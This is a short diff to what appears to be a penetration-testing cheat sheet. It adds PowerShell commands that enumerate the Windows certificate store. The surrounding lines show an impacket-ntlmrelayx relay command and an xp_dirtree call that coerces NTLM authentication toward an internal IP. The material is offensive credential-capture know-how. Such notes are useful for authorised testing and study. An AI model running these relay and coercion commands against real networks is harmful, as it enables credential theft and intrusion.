@@ -890,6 +890,11 @@ proxychains -q -f met.conf impacket-ntlmrelayx --no-http-server -smb2support -t 
 # current sql
 xp_dirtree '\\192.168.10.11\a';
 ```
+powershell check certs
+```
+gci Cert:\ -Recurse
+gci Cert:\ -Recurse | select-string "XXXX"
+```
 powershell cred
 ```
 $username = 'username'
